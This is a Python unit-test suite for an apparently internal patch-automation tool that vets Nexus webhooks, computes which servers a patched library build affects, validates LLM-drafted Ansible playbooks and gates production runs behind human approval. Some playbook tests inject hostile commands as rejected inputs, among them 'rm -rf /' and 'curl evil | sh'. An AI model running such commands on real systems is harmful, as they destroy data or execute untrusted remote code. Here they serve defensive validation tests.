"""Applications v2: the parts that decide what reaches a server.

    python3 -m unittest discover -s tests
"""
import hashlib
import hmac
import re
import json
import sys
import tempfile
import time
import types
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import appv2  # noqa: E402


def demo(**extra):
    # Every test gets its own state directory: a live-mode test must never write into the repo's runs/, where a
    # local console would restore it at startup.
    extra.setdefault('APPV2_STATE_DIR', tempfile.mkdtemp(prefix='appv2-test-'))
    extra.setdefault('REPORTS_DIR', tempfile.mkdtemp(prefix='appv2-reports-'))
    appv2.configure(env=lambda k, d='': extra.get(k, d), demo_mode=lambda: True,
                    demo_pause=lambda f=1.0: None, llm=None, ao_call=None, fixed_cves=None)
    appv2.reset()
    appv2._BOM_UPDATES.clear()


class Versions(unittest.TestCase):
    def test_upstream(self):
        self.assertEqual(appv2.upstream('2.24.3.rhlw-00004'), '2.24.3')
        self.assertEqual(appv2.upstream('5.3.17.rhlw-00001-n0001'), '5.3.17')
        self.assertEqual(appv2.upstream('2.24.3'), '2.24.3')
        self.assertTrue(appv2.is_lightwell('2.11.0.rhlw-00009'))
        self.assertFalse(appv2.is_lightwell('2.11.0'))


class Webhook(unittest.TestCase):
    BODY = json.dumps({'action': 'CREATED', 'repositoryName': 'lightwell-remediated',
                       'component': {'format': 'maven2', 'group': 'org.apache.mina',
                                     'name': 'mina-core', 'version': '2.2.5.rhlw-00002'}}).encode()

    def sign(self, body, secret='s3cret'):
        return hmac.new(secret.encode(), body, hashlib.sha1).hexdigest()

    def test_signature(self):
        self.assertTrue(appv2.verify_signature(self.BODY, self.sign(self.BODY), 's3cret'))
        self.assertFalse(appv2.verify_signature(self.BODY, self.sign(self.BODY, 'other'), 's3cret'))
        self.assertFalse(appv2.verify_signature(self.BODY, '', 's3cret'))
        self.assertFalse(appv2.verify_signature(self.BODY, self.sign(self.BODY), ''))

    def test_rejects_bad_signature_when_secret_set(self):
        demo(NEXUS_WEBHOOK_SECRET='s3cret')
        code, _ = appv2.accept_webhook(self.BODY, 'deadbeef')
        self.assertEqual(code, 401)
        code, body = appv2.accept_webhook(self.BODY, self.sign(self.BODY))
        self.assertEqual(code, 200)
        self.assertEqual(body['event']['artifact'], 'mina-core')

    def test_live_without_secret_trusts_nothing(self):
        demo()
        appv2.configure(demo_mode=lambda: False)
        appv2.EVENTS = appv2.EventStore(None)
        code, _ = appv2.accept_webhook(self.BODY, '')
        self.assertEqual(code, 503)

    def test_parse_only_new_lightwell_builds(self):
        p = json.loads(self.BODY)
        self.assertIsNotNone(appv2.parse_nexus(p))
        self.assertIsNone(appv2.parse_nexus({**p, 'action': 'UPDATED'}))
        self.assertIsNone(appv2.parse_nexus({**p, 'component': {**p['component'], 'version': '2.2.5'}}))
        self.assertIsNone(appv2.parse_nexus({**p, 'component': {**p['component'], 'group': ''}}))
        self.assertIsNone(appv2.parse_nexus('nope'))

    def test_duplicate_delivery_is_one_event(self):
        demo()
        store = appv2.EventStore(None)
        before = len(store.all())
        a = store.add(appv2.parse_nexus(json.loads(self.BODY)))
        b = store.add(appv2.parse_nexus(json.loads(self.BODY)))
        self.assertEqual(a['id'], b['id'])
        self.assertEqual(len(store.all()), before)        # the demo inbox already holds this build


class Impact(unittest.TestCase):
    def setUp(self):
        demo()

    def ev(self, artifact):
        return next(e for e in appv2.DEMO_EVENTS if e['artifact'] == artifact)

    def test_exact_version_only(self):
        imp = appv2.impact(self.ev('mina-core'), appv2.load_bom())
        exact = [t for t in imp['targets'] if not t.get('version_change')]
        self.assertEqual({t['app'] for t in exact}, {'workflow-engine'})
        self.assertEqual([t['site'] for t in exact], ['lab', 'edge-site-1', 'core-dc-1', 'core-dc-2'])
        self.assertEqual(imp['targets'][0]['env'], 'qa')                      # the lab first, then BOM order
        self.assertEqual(imp['targets'][0]['domain'], 'NFVO / MANO')
        self.assertEqual(imp['other'], [])

    def test_older_version_on_the_same_line_is_a_version_change(self):
        imp = appv2.impact(self.ev('mina-core'), appv2.load_bom())
        vc = [t for t in imp['targets'] if t.get('version_change')]
        self.assertEqual([(t['app'], t['installed'], t['to_version']) for t in vc],
                         [('inventory-service', '2.1.6', '2.2.5')] * 2)
        self.assertEqual(imp['targets'][-1]['key'], vc[-1]['key'])            # after the exact matches

    def test_other_major_or_newer_is_left_alone(self):
        ev = self.ev('mina-core')
        bom = [{'app': a, 'servers': [{'host': 'h', 'env': 'qa'}],
                'dependencies': [{'group': 'org.apache.mina', 'artifact': 'mina-core', 'version': v}]}
               for a, v in (('old-major', '1.1.7'), ('newer', '2.2.8'))]
        imp = appv2.impact(ev, bom)
        self.assertEqual(imp['targets'], [])
        self.assertEqual({o['app']: o['why'].split(';')[0] for o in imp['other']},
                         {'old-major': 'major version 1', 'newer': 'newer than 2.2.5'})

    def test_version_changes_are_opt_in(self):
        appv2.start_assess('evt-mina-core'); wait_for({'assessed'})
        appv2.start_generate()
        st = wait_for({'generated'})
        self.assertNotIn('inventory-service|lab', st['selected'])
        self.assertEqual([p['app'] for p in st['playbooks']], ['workflow-engine'])
        appv2.reset(); demo()
        appv2.start_assess('evt-mina-core'); wait_for({'assessed'})
        appv2.start_generate(['inventory-service|lab'])
        pb = wait_for({'generated'})['playbooks'][0]
        self.assertEqual((pb['app'], pb['changes'][0]['old_jar'], pb['changes'][0]['new_jar']),
                         ('inventory-service', 'mina-core-2.1.6.jar', 'mina-core-2.2.5.rhlw-00002.jar'))

    def test_lab_sites_first_across_apps(self):
        imp = appv2.impact(self.ev('zookeeper'), appv2.load_bom())
        self.assertEqual([t['env'] for t in imp['targets']][:2], ['qa', 'qa'])
        self.assertEqual(len({t['key'] for t in imp['targets']}), 6)         # both apps have a lab copy

    def test_non_maven_dependencies_are_skipped(self):
        bom = [{'app': 'x', 'servers': [{'host': 'h', 'env': 'qa'}],
                'dependencies': [{'group': 'org.apache.mina', 'artifact': 'mina-core', 'version': '2.2.5',
                                  'ecosystem': 'pypi'}]}]
        imp = appv2.impact(self.ev('mina-core'), bom)
        self.assertEqual((imp['apps'], imp['other']), ([], []))

    def test_write_back_removes_app_from_next_impact(self):
        ev = self.ev('postgresql')
        appv2._BOM_UPDATES['billing-engine|org.postgresql:postgresql'] = ev['version']
        imp = appv2.impact(ev, appv2.load_bom())
        self.assertEqual(imp['apps'], ['inventory-service'])
        self.assertIn('already on this build', [o['why'] for o in imp['other']])


class Playbook(unittest.TestCase):
    def setUp(self):
        demo()
        ev = appv2.DEMO_EVENTS[0]
        self.text = appv2.render_playbook(ev, appv2.impact(ev, appv2.load_bom())['targets'][0])

    def ok(self, text):
        return {c['id']: c['ok'] for c in appv2.check_playbook(text)}

    def test_template_passes(self):
        self.assertTrue(all(self.ok(self.text).values()), appv2.check_playbook(self.text))

    def test_rejects_shell(self):
        bad = self.text.replace('ansible.builtin.systemd_service:', 'ansible.builtin.shell: systemctl restart x\n          ansible.builtin.systemd_service:', 1)
        self.assertFalse(self.ok(bad)['modules'])
        bad = self.text.replace('        - name: Restart the service\n',
                                '        - name: Restart the service\n          shell: rm -rf /\n', 1)
        self.assertFalse(self.ok(bad)['modules'])

    def test_rejects_unknown_collection(self):
        bad = self.text.replace('ansible.builtin.uri:', 'community.general.something:', 1)
        self.assertFalse(self.ok(bad)['modules'])

    def test_requires_verify_and_rollback(self):
        no_rescue = self.text.split('      rescue:')[0]
        self.assertFalse(self.ok(no_rescue)['rollback'])
        no_verify = self.text.replace('ansible.builtin.uri:', 'ansible.builtin.debug:')
        self.assertFalse(self.ok(no_verify)['verify'])
        no_pin = self.text.replace('checksum: "sha256:', 'checksum_off: "')
        self.assertFalse(self.ok(no_pin)['checksum'])

    def test_flattened_block_is_rejected(self):
        # The live LLM's 2026-11-06 shape: the block's tasks pulled up a level, its rescue: left behind.
        lines, out, inside = self.text.split('\n'), [], False
        for l in lines:
            if l.strip() == 'block:':
                inside = True
                continue
            if l.strip() == 'rescue:':
                out.append('          rescue:')
                inside = False
                continue
            out.append(l[4:] if inside and l.startswith('        ') else l)
        ok = {c['id']: c['ok'] for c in appv2.check_playbook('\n'.join(out), self.text)}
        self.assertFalse(ok['structure'])

    def test_tasks_only_draft_is_rejected(self):
        # What the live LLM produced on 2026-11-05: the task list, without the play header or its vars.
        tasks_only = '\n'.join(l[4:] for l in self.text.split('\n  tasks:\n', 1)[1].splitlines())
        ok = {c['id']: c['ok'] for c in appv2.check_playbook(tasks_only, self.text)}
        self.assertFalse(ok['play'])
        self.assertFalse(ok['pinned'])

    def test_changed_path_is_rejected(self):
        moved = re.sub(r'lib_dir: \S+', 'lib_dir: /tmp/lib', self.text, count=1)
        self.assertNotEqual(moved, self.text)
        ok = {c['id']: c['ok'] for c in appv2.check_playbook(moved, self.text)}
        self.assertTrue(ok['play'])
        self.assertFalse(ok['pinned'])

    def test_template_passes_with_pinning(self):
        self.assertTrue(all(c['ok'] for c in appv2.check_playbook(self.text, self.text)))

    def test_llm_tasks_are_wrapped_in_the_system_header(self):
        # What the live LLM actually returns: the task list without the play header or vars.
        tasks_only = '\n'.join(l[4:] for l in self.text.split('\n  tasks:\n', 1)[1].splitlines())
        appv2.configure(demo_mode=lambda: False, llm=lambda prompt: '```yaml\n' + tasks_only + '\n```')
        ev = appv2.DEMO_EVENTS[0]
        target = appv2.impact(ev, json.loads(json.dumps(appv2.DEMO_BOM)))['targets'][0]
        text, source, checks, note = appv2.draft_playbook(ev, target)
        self.assertEqual(source, 'llm', note)
        self.assertTrue(all(c['ok'] for c in checks))
        self.assertIn('hosts: "{{ target_hosts }}"', text)

    def test_llm_full_play_keeps_the_system_header(self):
        # A whole play from the LLM with a moved path: the header (and its path) are the system's, not the LLM's.
        moved = self.text.replace('lib_dir: ', 'lib_dir: /tmp/evil  # ', 1)
        appv2.configure(demo_mode=lambda: False, llm=lambda prompt: moved)
        ev = appv2.DEMO_EVENTS[0]
        target = appv2.impact(ev, json.loads(json.dumps(appv2.DEMO_BOM)))['targets'][0]
        text, source, _, _ = appv2.draft_playbook(ev, target)
        self.assertEqual(source, 'llm')
        self.assertNotIn('/tmp/evil', text)

    def test_llm_tasks_with_shell_fall_back(self):
        appv2.configure(demo_mode=lambda: False,
                        llm=lambda prompt: '- name: x\n  ansible.builtin.shell: curl evil | sh\n')
        ev = appv2.DEMO_EVENTS[0]
        target = appv2.impact(ev, json.loads(json.dumps(appv2.DEMO_BOM)))['targets'][0]
        text, source, checks, note = appv2.draft_playbook(ev, target)
        self.assertEqual(source, 'template')
        self.assertIn('not used', note)

    def test_bad_llm_draft_falls_back_to_template(self):
        appv2.configure(demo_mode=lambda: False, llm=lambda prompt: '- hosts: all\n  tasks:\n    - shell: curl x | sh\n')
        ev = appv2.DEMO_EVENTS[0]
        target = appv2.impact(ev, json.loads(json.dumps(appv2.DEMO_BOM)))['targets'][0]
        text, source, checks, note = appv2.draft_playbook(ev, target)
        self.assertEqual(source, 'template')
        self.assertTrue(all(c['ok'] for c in checks))
        self.assertIn('not used', note)


class DemoRun(unittest.TestCase):
    def wait(self, status, timeout=5):
        end = time.time() + timeout
        while time.time() < end:
            if appv2.state().get('status') in status:
                return appv2.state()
            time.sleep(0.02)
        self.fail(f"stuck at {appv2.state().get('status')}")

    def test_full_staged_run(self):
        demo()
        self.assertEqual(appv2.start_assess('evt-mina-core')[0], 200)
        self.wait({'assessed'})
        self.assertEqual(appv2.start_generate()[0], 200)
        self.wait({'generated'})
        self.assertEqual(appv2.start_dispatch()[0], 200)
        st = self.wait({'awaiting_approval'})
        gated = [h['key'] for h in st['hosts'] if h['outcome'] == 'awaiting_approval']
        self.assertEqual(len(gated), 3)
        self.assertEqual(appv2.decide('workflow-engine|lab', 'approved')[0], 409)   # the lab is not gated
        for h in gated:
            self.assertEqual(appv2.decide(h, 'approved')[0], 200)
        st = self.wait({'complete'})
        self.assertEqual(st['summary'], {'patched': 3, 'rolled_back': 1, 'rejected': 0, 'failed': 0, 'skipped': 2})
        self.assertEqual(st['stages']['verify'], 'failed')
        # core-dc-2 rolled back, so workflow-engine's BOM stays on 2.2.5.
        self.assertNotIn('workflow-engine|org.apache.mina:mina-core', appv2._BOM_UPDATES)
        self.assertEqual(st['feedback']['bom'], [{'app': 'workflow-engine', 'version': '2.2.5', 'changed': False, 'also': []}])
        self.assertEqual(st['feedback']['history']['records'], 4)
        # The Report agent's PDF.
        self.assertEqual(st['stages']['report'], 'done')
        pdf = Path(appv2.reports_dir()) / st['report']['file']
        self.assertTrue(pdf.read_bytes().startswith(b'%PDF'))

    def test_order_is_enforced(self):
        demo()
        self.assertEqual(appv2.start_generate()[0], 409)
        self.assertEqual(appv2.start_dispatch()[0], 409)
        self.assertEqual(appv2.start_assess('no-such-event')[0], 404)


class Poller(unittest.TestCase):
    META = ('<metadata><versioning><versions><version>2.24.3.rhlw-00004</version>'
            '<version>2.25.1.rhlw-00002</version><version>2.24.3</version></versions></versioning></metadata>')

    def test_requests_only_builds_of_installed_versions(self):
        demo(NEXUS_URL='https://nexus.lab', NEXUS_EVENTS='poller')
        asked = []

        def fetch(url):
            asked.append(url)
            if url.endswith('log4j-core/maven-metadata.xml'):
                return self.META.encode()
            if url.endswith('.jar'):
                return b'jar'
            raise OSError('404')

        apps = [{'app': 'a', 'dependencies': [{'group': 'org.apache.logging.log4j', 'artifact': 'log4j-core', 'version': '2.24.3'}]}]
        seen = set()
        found = appv2.poll_nexus(fetch, seen, apps)
        self.assertEqual([f['version'] for f in found], ['2.24.3.rhlw-00004'])   # not 2.25.1: nothing runs it
        self.assertTrue(any(u.endswith('log4j-core-2.24.3.rhlw-00004.jar') for u in asked))
        self.assertTrue(any(e['version'] == '2.24.3.rhlw-00004' for e in appv2.events().all()))
        self.assertEqual(appv2.poll_nexus(fetch, seen, apps), [])                 # seen: not requested twice

    def test_takes_only_the_newest_build_of_a_version(self):
        demo(NEXUS_URL='https://nexus.lab')
        meta = ('<versions><version>2.11.0.rhlw-00001</version><version>2.11.0.rhlw-00009</version>'
                '<version>2.13.0.rhlw-00007</version></versions>')
        got = []

        def fetch(url):
            if url.endswith('maven-metadata.xml'):
                return meta.encode()
            got.append(url)
            return b'jar'

        apps = [{'app': 'a', 'dependencies': [{'group': 'commons-io', 'artifact': 'commons-io', 'version': '2.11.0'}]}]
        found = appv2.poll_nexus(fetch, set(), apps)
        self.assertEqual([f['version'] for f in found], ['2.11.0.rhlw-00009'])
        self.assertEqual(len(got), 1)


class LiveFollow(unittest.TestCase):
    """The live path against a fake AO that walks one Prod execution through the App Patch v2 nodes."""

    def test_prod_host_stops_at_gate_then_patches(self):
        demo()
        phase = {'n': 'gate'}
        signals = []

        def ao(path, method='GET', body=None):
            if path == '/api/v1/workflows':
                return {'resources': [{'id': 'wf1', 'name': 'App Patch v2'}]}
            if path == '/api/v1/executions' and method == 'POST':
                return {'id': 'ex1'}
            if path.endswith('/signal'):
                signals.append((path, body))
                phase['n'] = 'done'
                return {}
            if path == '/api/v1/executions/ex1':
                return {'status': 'running' if phase['n'] == 'gate' else 'completed'}
            if path == '/api/v1/executions/ex1/activities':
                commit = {'temporal_activity_id': 'commit_to_gitea', 'status': 'completed', 'started_at': 't',
                          'output_data': {'artifacts': {'commit_sha': 'abc123', 'jar_sha256': 'f' * 64,
                                                        'provenance_verified': True, 'commit_url': 'https://g/c'}}}
                gate = {'temporal_activity_id': 'approval_prod', 'node_type': 'approval', 'started_at': 't',
                        'status': 'waiting' if phase['n'] == 'gate' else 'completed'}
                run = {'temporal_activity_id': 'run_app_patch_prod', 'status': 'completed', 'started_at': 't',
                       'output_data': {'artifacts': {'patched': True, 'version': 'x.jar'}}}
                return {'resources': [commit, gate] + ([run] if phase['n'] == 'done' else [])}
            raise AssertionError(path)

        appv2.configure(demo_mode=lambda: False, ao_call=ao)
        # Only appv2's clock: its poll interval goes to zero, the test's own waits stay real.
        appv2.time = types.SimpleNamespace(sleep=lambda s: None, time=time.time)
        try:
            appv2.EVENTS = appv2.EventStore(None)
            ev = dict(appv2.DEMO_EVENTS[0])
            target = {'key': 'billing-api|billing-prod-01', 'app': 'billing-api', 'host': 'billing-prod-01',
                      'env': 'prod', 'installed': '2.24.3',
                      'path': '/opt/apps/billing-api', 'service': 'billing-api', 'health_url': 'http://x'}
            with appv2._LOCK:
                appv2._RUN.clear()
                appv2._RUN.update(status='generated', run_id='r1', event=ev, events=[],
                                  stages={k: 'pending' for k in appv2.STAGES},
                                  impact={'targets': [target], 'apps': ['billing-api'], 'other': []},
                                  playbooks=[{'app': 'billing-api', 'filename': 'app-v2/b.yml', 'text': 'x',
                                              'sha256': '0' * 64, 'ok': True}])
            appv2.start_dispatch()
            for _ in range(200):
                if appv2.state()['hosts'][0]['outcome'] == 'awaiting_approval':
                    break
                time.sleep(0.01)
            h = appv2.state()['hosts'][0]
            self.assertEqual(h['outcome'], 'awaiting_approval')
            self.assertEqual(h['commit_sha'], 'abc123')
            self.assertEqual(h['provenance'], 'verified')
            self.assertEqual(appv2.decide('billing-prod-01', 'approved')[0], 200)
            self.assertEqual(signals[0][1], {'signal_data': {'decision': 'approved'}})
            for _ in range(200):
                if appv2.state().get('status') == 'complete':
                    break
                time.sleep(0.01)
            st = appv2.state()
            self.assertEqual(st['status'], 'complete')
            self.assertEqual(st['hosts'][0]['outcome'], 'patched')
            self.assertEqual(st['hosts'][0]['steps']['verify'], 'done')
        finally:
            appv2.time = time


class Restart(unittest.TestCase):
    """Live mode: the run outlives a console restart. A restart is simulated by emptying the in-memory run and
    calling restore(), which is what a new process does at startup."""

    def setUp(self):
        import tempfile
        self.dir = tempfile.mkdtemp()
        self.signals = []
        self.phase = 'running'

        def ao(path, method='GET', body=None):
            if path.endswith('/signal'):
                self.signals.append(body)
                return {}
            if path.endswith('/activities'):
                run = {'temporal_activity_id': 'run_app_patch', 'status': 'completed', 'started_at': 't',
                       'output_data': {'artifacts': {'patched': True, 'version': 'x.jar'}}}
                return {'resources': [run] if self.phase == 'done' else []}
            return {'status': 'completed' if self.phase == 'done' else 'running'}

        demo(APPV2_STATE_DIR=self.dir)
        appv2.configure(demo_mode=lambda: False, ao_call=ao)
        self.clock = appv2.time
        appv2.time = types.SimpleNamespace(sleep=lambda s: None, time=time.time)

    def tearDown(self):
        appv2.time = self.clock
        appv2.reset()

    def saved_run(self, status, hosts):
        with appv2._LOCK:
            appv2._RUN.clear()
            appv2._RUN.update(status=status, run_id='r1', event=dict(appv2.DEMO_EVENTS[0]), events=[],
                              stages={k: 'pending' for k in appv2.STAGES}, hosts=hosts,
                              impact={'targets': [], 'apps': ['workflow-engine'], 'other': []}, playbooks=[])
        appv2._persist()
        with appv2._LOCK:                       # the process "dies": memory is gone, the file is not
            appv2._RUN.clear()
            appv2._RUN['status'] = 'idle'

    def host(self, name, env, outcome):
        return {'key': f'workflow-engine|{name}', 'host': name, 'app': 'workflow-engine', 'env': env, 'outcome': outcome,
                'steps': {},
                'execution_id': f'ex-{name}'}

    def test_gate_survives_and_can_be_approved(self):
        self.saved_run('awaiting_approval', [self.host('node2', 'prod', 'awaiting_approval')])
        r = appv2.restore()
        self.assertTrue(r['restored'])
        self.assertEqual(appv2.state()['status'], 'awaiting_approval')
        self.assertEqual(appv2.decide('node2', 'rejected')[0], 200)
        self.assertEqual(self.signals, [{'signal_data': {'decision': 'rejected'}}])

    def test_running_execution_is_followed_again(self):
        self.phase = 'done'
        self.saved_run('running', [self.host('node1', 'qa', 'running')])
        self.assertEqual(appv2.restore()['resumed'], ['workflow-engine|node1'])
        for _ in range(300):
            if appv2.state()['status'] == 'complete':
                break
            time.sleep(0.01)
        self.assertEqual(appv2.state()['hosts'][0]['outcome'], 'patched')
        self.assertIn('workflow-engine|org.apache.mina:mina-core', json.loads(
            (Path(self.dir) / 'appv2-bom-updates.json').read_text()))

    def test_step_inside_the_console_is_reported_interrupted(self):
        self.saved_run('generating', [])
        appv2.restore()
        st = appv2.state()
        self.assertEqual(st['status'], 'failed')
        self.assertIn('restarted during generate', st['error'])

    def test_bom_write_backs_survive(self):
        (Path(self.dir) / 'appv2-bom-updates.json').write_text(json.dumps({'a|g:x': '1.rhlw-00001'}))
        appv2._BOM_UPDATES.clear()
        appv2.restore()
        self.assertEqual(appv2._BOM_UPDATES.get('a|g:x'), '1.rhlw-00001')

    def test_demo_mode_writes_nothing(self):
        appv2.configure(demo_mode=lambda: True)
        appv2._set(status='assessed')
        self.assertFalse((Path(self.dir) / 'appv2-run.json').exists())


class Subset(unittest.TestCase):
    def wait(self, statuses, timeout=5):
        end = time.time() + timeout
        while time.time() < end:
            if appv2.state().get('status') in statuses:
                return appv2.state()
            time.sleep(0.02)
        self.fail(f"stuck at {appv2.state().get('status')}")

    def test_only_selected_pairs_run(self):
        demo()
        appv2.start_assess('evt-zookeeper'); self.wait({'assessed'})
        appv2.start_generate(); self.wait({'generated'})
        self.assertEqual(appv2.start_dispatch([])[0], 400)                       # nothing selected
        self.assertEqual(appv2.start_dispatch(['inventory-service|lab', 'inventory-service|core-dc-1', 'not|known'])[0], 200)
        st = self.wait({'awaiting_approval'})
        self.assertEqual(appv2.decide('inventory-service|core-dc-1', 'approved')[0], 200)
        st = self.wait({'complete'})
        by = {h['key']: h for h in st['hosts']}
        self.assertEqual(by['inventory-service|lab']['outcome'], 'patched')
        self.assertEqual(by['workflow-engine|lab']['outcome'], 'skipped')
        self.assertFalse(by['workflow-engine|lab']['execution_id'])         # never sent to AO
        self.assertEqual(st['summary']['skipped'], 4)
        # Both inventory-service sites were patched; workflow-engine was not touched, so its BOM stays.
        self.assertIn('inventory-service|org.apache.zookeeper:zookeeper', appv2._BOM_UPDATES)
        self.assertNotIn('workflow-engine|org.apache.zookeeper:zookeeper', appv2._BOM_UPDATES)

    def test_sites_chosen_before_prepare(self):
        demo()
        appv2.start_assess('evt-zookeeper'); self.wait({'assessed'})
        self.assertEqual(appv2.start_generate([])[0], 400)                       # nothing selected
        self.assertEqual(appv2.start_generate(['inventory-service|lab', 'inventory-service|core-dc-1'])[0], 200)
        st = self.wait({'generated'})
        self.assertEqual([p['app'] for p in st['playbooks']], ['inventory-service'])   # nothing drafted for nfvo
        # The run can narrow the prepared sites but not widen them: nfvo has no playbook.
        self.assertEqual(appv2.start_dispatch(['workflow-engine|lab'])[0], 400)
        self.assertEqual(appv2.start_dispatch(['inventory-service|lab', 'workflow-engine|lab'])[0], 200)
        st = self.wait({'complete'})
        by = {h['key']: h for h in st['hosts']}
        self.assertEqual(by['inventory-service|lab']['outcome'], 'patched')
        self.assertEqual(by['inventory-service|core-dc-1']['outcome'], 'skipped')
        self.assertEqual(by['workflow-engine|lab']['outcome'], 'skipped')
        self.assertEqual(st['summary']['skipped'], 5)

    def test_reasoning_is_on_every_target(self):
        demo()
        appv2.start_assess('evt-mina-core'); st = self.wait({'assessed'})
        self.assertTrue(all(t.get('reasoning') for t in st['impact']['targets']))
        self.assertIn('340 NEs', next(t for t in st['impact']['targets']
                                      if t['key'] == 'workflow-engine|core-dc-1')['reasoning'])


class Reasoning(unittest.TestCase):
    T = [{'key': 'sample-app|node2', 'app': 'sample-app', 'host': 'node2'},
         {'key': 'orders-api|node1', 'app': 'orders-api', 'host': 'node1'}]

    def setUp(self):
        demo(APP_VECTOR_DB_ID='vs_apps')
        appv2.configure(demo_mode=lambda: False)

    def test_keeps_only_records_about_that_app_and_server(self):
        hits = {'sample-app': ['App: sample-app Server: node2\nLessons:\nAllow 60 seconds.',
                               'App: sample-app Server: node1\nLessons:\nQuick on QA.'],
                'orders-api': ['App: sample-app Server: node3\nLessons:\nStandby.']}
        appv2.configure(rag_search=lambda store, q: hits['sample-app' if 'sample-app' in q else 'orders-api'],
                        llm=lambda prompt: '{"1": "Give node2 a 60s health window."}')
        notes, source = appv2.reasoning(self.T)
        self.assertEqual(notes['sample-app|node2'], 'Give node2 a 60s health window.')
        self.assertEqual(notes['orders-api|node1'], 'No history found for this app on this server.')
        self.assertEqual(source, 'rag+llm')

    def test_falls_back_to_the_records_own_words(self):
        appv2.configure(rag_search=lambda store, q: ['App: sample-app Server: node2\nLessons:\nAllow 60 seconds.'],
                        llm=lambda prompt: 'not json at all')
        notes, _ = appv2.reasoning(self.T[:1])
        self.assertEqual(notes['sample-app|node2'], 'Allow 60 seconds.')

    def test_no_store_says_so(self):
        demo()
        appv2.configure(demo_mode=lambda: False)
        notes, source = appv2.reasoning(self.T)
        self.assertEqual(source, 'none')
        self.assertIn('APP_VECTOR_DB_ID', notes['sample-app|node2'])


class Catalog(unittest.TestCase):
    def test_demo_marks_builds_the_apps_need(self):
        demo()
        mine = appv2.catalog('mine')
        builds = {r['build']: r['affects'] for r in mine['rows']}
        self.assertEqual(builds['2.2.5.rhlw-00002'], ['workflow-engine'])
        self.assertEqual(builds['3.5.9.rhlw-00001'], ['inventory-service', 'workflow-engine'])
        everything = appv2.catalog('all')
        self.assertGreater(everything['total'], mine['total'])

    def test_live_mine_asks_per_library_version(self):
        demo()
        asked = []

        def lw(path, **params):
            asked.append((path, params.get('package_name'), params.get('package_version')))
            if params.get('package_name') == 'org.apache.mina:mina-core' and params.get('package_version') == '2.2.5':
                return {'data': [{'advisory_id': 'x', 'aliases': ['CVE-2026-1'], 'fixed_versions': ['2.2.5.rhlw-00002']}]}
            return {'data': []}

        appv2.configure(demo_mode=lambda: False, lightwell_get=lw,
                        env=lambda k, d='': {'BOM_DIR': str(Path(__file__).resolve().parents[1] / 'app-data' / 'bom'),
                                             'APPV2_STATE_DIR': tempfile.mkdtemp()}.get(k, d))
        out = appv2.catalog('mine')
        self.assertEqual([(r['build'], r['cves'], r['affects']) for r in out['rows']],
                         [('2.2.5.rhlw-00002', ['CVE-2026-1'], ['workflow-engine'])])
        self.assertIn(('/advisories', 'org.postgresql:postgresql', '42.3.3'), asked)
        self.assertIn(('/advisories', 'org.apache.mina:mina-core', '2.1.6'), asked)   # inventory-service's
        self.assertFalse([a for a in asked if a[1] in ('ricxappframe', 'express')])   # Lightwell Java only


class Sbom(unittest.TestCase):
    def test_cyclonedx_from_the_bom(self):
        demo()
        doc = appv2.sbom('workflow-engine')
        self.assertEqual((doc['bomFormat'], doc['specVersion']), ('CycloneDX', '1.5'))
        self.assertEqual(doc['metadata']['component']['name'], 'workflow-engine')
        purls = {c['purl'] for c in doc['components']}
        self.assertIn('pkg:maven/org.apache.mina/mina-core@2.2.5', purls)
        self.assertEqual(doc['dependencies'][0]['dependsOn'], [c['bom-ref'] for c in doc['components']])
        self.assertIsNone(appv2.sbom('no-such-app'))

    def test_write_back_changes_the_exported_version(self):
        demo()
        appv2._BOM_UPDATES['workflow-engine|org.apache.mina:mina-core'] = '2.2.5.rhlw-00002'
        purls = {c['purl'] for c in appv2.sbom('workflow-engine')['components']}
        self.assertIn('pkg:maven/org.apache.mina/mina-core@2.2.5.rhlw-00002', purls)


class History(unittest.TestCase):
    def test_runs_newest_first_and_detail(self):
        demo()
        before = appv2.runs()
        self.assertEqual(len(before), 2)                                          # the staged past runs
        appv2.start_assess('evt-postgresql')
        for _ in range(200):
            if appv2.state().get('status') == 'assessed':
                break
            time.sleep(0.02)
        self.assertTrue(appv2.runs()[0]['current'])
        appv2.start_generate()
        for _ in range(200):
            if appv2.state().get('status') == 'generated':
                break
            time.sleep(0.02)
        appv2.start_dispatch(['inventory-service|lab'])
        for _ in range(300):
            if appv2.state().get('status') == 'complete':
                break
            time.sleep(0.02)
        runs = appv2.runs()
        self.assertEqual(len(runs), 3)
        self.assertFalse(runs[0]['current'])
        self.assertEqual(runs[0]['run_id'], appv2.state()['run_id'])
        self.assertEqual(appv2.run_detail(runs[0]['run_id'])['status'], 'complete')
        self.assertEqual(appv2.run_detail('past1')['event']['artifact'], 'zookeeper')


class Estate(unittest.TestCase):
    def test_groups_fixes_and_priorities(self):
        demo()
        rows = {r['app']: r for r in appv2.estate()['rows']}
        self.assertEqual(rows['workflow-engine']['group'], 'network')
        self.assertEqual(rows['billing-engine']['group'], 'it')
        self.assertEqual({f['artifact'] for f in rows['workflow-engine']['fixes']},
                         {'mina-core', 'zookeeper', 'spring-security-web'})
        self.assertFalse(rows['analytics-agent']['covered'])                         # Python only
        self.assertFalse(rows['customer-portal']['covered'])                     # npm only
        self.assertEqual(rows['workflow-engine']['priority'], 'CRITICAL')
        self.assertTrue(all(r['priority'] in ('CRITICAL', 'HIGH', 'MEDIUM', 'LOW') and r['note']
                            for r in rows.values()))

    def test_live_reasoning_falls_back_to_the_rule(self):
        demo()
        appv2.configure(demo_mode=lambda: False, llm=lambda prompt: 'not json', rag_search=lambda s, q: [],
                        lightwell_get=lambda path, **p: {'data': []},
                        env=lambda k, d='': {'BOM_DIR': str(Path(__file__).resolve().parents[1] / 'app-data' / 'bom'),
                                             'APPV2_STATE_DIR': tempfile.mkdtemp()}.get(k, d))
        rows = {r['app']: r for r in appv2.estate()['rows']}
        self.assertEqual(set(rows), {'workflow-engine', 'inventory-service', 'analytics-agent', 'customer-portal'})
        self.assertTrue(all(r['priority'] and r['note'] for r in rows.values()))

    def test_live_reasoning_accepts_a_list_shape(self):
        demo()
        appv2._ESTATE_CACHE.clear()
        calls = []

        def llm(prompt):
            calls.append(1)
            return '[{"App": "inventory-service", "Priority": "high", "Reasoning": "Feeds topology."}]'
        appv2.configure(demo_mode=lambda: False, llm=llm, rag_search=lambda s, q: [],
                        lightwell_get=lambda path, **p: {'data': []},
                        env=lambda k, d='': {'BOM_DIR': str(Path(__file__).resolve().parents[1] / 'app-data' / 'bom'),
                                             'APPV2_STATE_DIR': tempfile.mkdtemp()}.get(k, d))
        rows = {r['app']: r for r in appv2.estate()['rows']}
        self.assertEqual((rows['inventory-service']['priority'], rows['inventory-service']['note']), ('HIGH', 'Feeds topology.'))
        appv2.estate()
